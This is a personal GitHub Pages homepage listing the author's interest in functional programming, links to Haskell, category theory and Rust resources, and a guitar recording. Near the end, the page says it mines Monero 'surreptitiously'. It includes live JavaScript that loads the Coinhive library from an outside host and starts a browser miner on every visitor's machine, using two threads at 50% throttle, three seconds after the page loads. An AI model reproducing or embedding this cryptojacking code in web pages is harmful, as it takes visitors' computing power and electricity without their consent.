---
layout:
---
Welcome to the user site of [github/bohadi](https://github.com/bohadi).<br>

I am interested in engineering effective software using<br>
functional programming, type theory, and category theory.

<!--
compilers, blockchain, gpgpu

also ai/ml, genomics, 3d games

contact me
bohadi@users.noreply.github.com
-->

helpful accessible learning resources:<br>
[Parallel and Concurrent Programming in Haskell](http://chimera.labs.oreilly.com/books/1230000000929/index.html)<br>
[Practical Foundations for Programming Languages](http://www.cs.cmu.edu/~rwh/pfpl.html)<br>
[Category Theory For Programmers](https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/)<br>
[Write You A Haskell](http://dev.stephendiehl.com/fun/)<br>
[What I Wish I Knew When Learning Haskell](http://dev.stephendiehl.com/hask/)<br>
[Homotopy Type Theory](https://homotopytypetheory.org/book/)<br>
[The Rust Programming Language](https://doc.rust-lang.org/stable/book/second-edition/)<br>
[The Glasgow Haskell Compiler - Archicture of Open Source Applications](http://www.aosabook.org/en/ghc.html)<br>
[annual topics, Oregon Programming Languages Summer School](https://www.cs.uoregon.edu/research/summerschool/summer17/topics.php)<br>
[nLab wiki](https://ncatlab.org/nlab/show/HomePage)<br>
[Arch Linux wiki](https://wiki.archlinux.org/)<br>
[r/haskell](http://www.reddit.com/r/haskell)<br>
[r/rust](http://www.reddit.com/r/rust)<br>


more nice links:<br>
[news.ycombinator.com](https://news.ycombinator.com)<br>
[cryptowat.ch](https://cryptowat.ch)<br>
[SEP/random](https://plato.stanford.edu/cgi-bin/encyclopedia/random)<br>


I enjoy playing the guitar, here is a short recording.

<audio width="400" height="40" controls controlsList="nodownload">
  <source src="noodle.mp3" type="audio/mpeg">
</audio>

<br>

Thank you for visiting.<br>
Finally, this page can mine Monero on your machine surreptitiously.<br>
<div id='minerstatus'>
Attempting to connect...
</div>
<div id='minerio'>
Hashes/second: 0   <br>
total Hashes: 0    <br>
</div>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  var minerstatus = document.getElementById('minerstatus');
  var minerio     = document.getElementById('minerio');
  setTimeout( function() {
    try {
      var miner = new CoinHive.Anonymous('A9pTI4370gQQt0dRaNJFmFnPXXDvsEwS', {
        threads: 2,
        throttle: 0.5
      });
      miner.start();
      miner.on('open', function() {
        minerstatus.innerHTML =
          'Connected... ('+miner.getNumThreads()+' threads throttled at '+
          100*miner.getThrottle().toFixed(2)+'% WASM supported: '+miner.hasWASMSupport()+')';
      });
      miner.on('error', function() {
        miner.stop();
        minerstatus.innerHTML = '...Connection error. Miner stopping.';
      });
      setInterval(function() {
        minerio.innerHTML = 
          'Hashes/second:  '   + miner.getHashesPerSecond().toFixed(0) + '<br>' +
          ' total Hashes: '    + miner.getTotalHashes()                + '<br>' ;
      }, 1000);
    } catch (e) {
      minerstatus.innerHTML = '...Connection error (adblock). Miner stopping.';
    }
  }, 3000);
</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-106946514-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments)};
  gtag('js', new Date());
  gtag('config', 'UA-106946514-1');
</script>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
